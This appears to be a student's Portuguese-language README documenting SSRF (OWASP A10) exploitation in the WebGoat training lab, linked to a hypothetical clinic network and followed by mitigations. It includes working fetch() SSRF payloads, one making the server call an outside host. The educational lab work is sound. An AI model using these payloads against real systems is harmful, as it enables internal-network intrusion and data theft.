# 🛡️ Avaliação de Segurança Ofensiva: Exploração de SSRF (OWASP A10) e Análise de Risco Corporativo

![Status](https://img.shields.io/badge/Status-Concluído-success)
![OWASP](https://img.shields.io/badge/OWASP-A10%3A2021--SSRF-red)
![Docker](https://img.shields.io/badge/Lab-Docker%20%7C%20WebGoat-blue)
![LGPD](https://img.shields.io/badge/Compliance-LGPD-orange)

## 📌 Visão Geral do Projeto
Este projeto consiste em uma análise prática de segurança ofensiva focada na categoria **(A10:2021) Server-Side Request Forgery (SSRF)** do OWASP Top 10, integrada a um projeto de extensão acadêmica no curso de **Tecnologia em Segurança da Informação (UNINOVE)**.

O estudo correlaciona a exploração técnica em ambiente de laboratório (**OWASP WebGoat**) com a análise de impacto em um cenário corporativo real do setor de saúde: a **Clínica MediCare Diagnósticos**.

---

## 🏥 O Cenário de Estudo: Clínica MediCare Diagnósticos
A infraestrutura avaliada ("As-Is") apresenta os seguintes ativos críticos e fraquezas de arquitetura:
* **Portal do Paciente:** Hospedado na DMZ (IP `172.16.0.5`), portas 80/443 abertas para a Internet, sem Web Application Firewall (WAF).
* **Banco de Dados em Nuvem (MySQL - 3306):** Armazena prontuários e laudos médicos sem criptografia em repouso. O firewall interno permite tráfego irrestrito originado da DMZ para o banco.
* **Rede Interna Permissiva:** Falta de ACLs entre VLANs, permitindo alcance direto da DMZ para a rede de telefonia VoIP (VLAN 30 - IP `192.168.30.10`).

### 💥 Como o SSRF quebra a segurança da clínica:
Mesmo com um firewall de borda bloqueando conexões externas para os servidores internos, a exploração de **SSRF no Portal do Paciente** permite que um atacante remoto force o próprio servidor da DMZ a disparar requisições para a rede interna. O servidor da DMZ atua como um **Proxy Malicioso**, permitindo a exfiltração de dados médicos e violação grave da LGPD.

---

## 🧪 Demonstração Prática (Proof of Concept - PoC)

### 1. Preparação do Ambiente
O laboratório foi provisionado isoladamente utilizando contêiner Docker:
```bash
docker run -d -p 8080:8080 -p 9090:9090 -e WEBGOAT_PORT=8080 -e WEBWOLF_PORT=9090 --name webgoat webgoat/webgoat:v2023.8
```

### 2. Execução dos Ataques (Passo a Passo)

#### 🔹 Task 1: Forjamento de Requisição de Recursos Internos
* **Vulnerabilidade:** A aplicação aceita o parâmetro `url=images/tom.png` sem sanitização.
* **Payload Injetado:** Modificação do parâmetro para `url=images/jerry.png` via Fetch API:
```javascript
fetch("http://localhost:8080/WebGoat/SSRF/task1", {
  headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" },
  body: "url=images%2Fjerry.png",
  method: "POST"
}).then(r => r.json()).then(console.log);
```
* **Resultado:** O servidor processou a requisição e retornou o recurso protegido.

#### 🔹 Task 2: Forjamento de Requisição Externa / Reconhecimento de IP
* **Vulnerabilidade:** O servidor aceita URLs com esquemas arbitrários (`http://`).
* **Payload Injetado:** Forçar o servidor a consultar um serviço externo de eco de IP (`http://ifconfig.pro`):
```javascript
fetch("http://localhost:8080/WebGoat/SSRF/task2", {
  headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" },
  body: "url=http%3A%2F%2Fifconfig.pro",
  method: "POST"
}).then(r => r.json()).then(console.log);
```
* **Resultado:** O servidor backend realizou a requisição de saída e expôs o IP de origem na resposta.

---

## 📸 Evidências Técnicas
As evidências completas e cronológicas encontram-se no diretório [`evidencias_a10/prints/`](./evidencias_a10/prints/):
* `01_ambiente_docker_webgoat.png` - Container WebGoat ativo no Docker Desktop.
* `07_reconhecimento_network_devtools.png` - Mapeamento de tráfego HTTP via DevTools.
* `10_payload_original_tom_png.png` - Identificação do parâmetro vulnerável.
* `11_execucao_ssrf_sucesso_task1.png` - Resposta da Task 1 com sucesso.
* `13_execucao_ssrf_sucesso_task2.png` - Resposta da Task 2 com sucesso.
* `14_modulo_ssrf_concluido_verde.png` - Módulo A10 concluído integralmente.

---

## 🛡️ Medidas de Mitigação (Defesa em Profundidade)
1. **Allowlist Estrita de URLs e Domínios:** Validar rigorosamente qualquer destino aceito pelo backend.
2. **Bloqueio de Faixas RFC 1918 e Loopback:** Impedir o servidor de fazer chamadas para `127.0.0.1`, `10.0.0.0/8`, `172.16.0.0/12` e `192.168.0.0/16`.
3. **Hardening de Rede e Firewall Egress:** Bloquear saídas arbitrárias originadas na DMZ em direção às portas críticas internas (MySQL 3306 e SIP 5060).
4. **WAF (Web Application Firewall):** Filtragem de assinaturas de SSRF na camada 7.

---

## 👨‍💻 Autor
* **Carlos Eduardo Gomes Pinho**  
* Curso de Segurança da Informação - Universidade Nove de Julho (UNINOVE)  
* [LinkedIn](https://www.linkedin.com/in/carlospinhoo/)
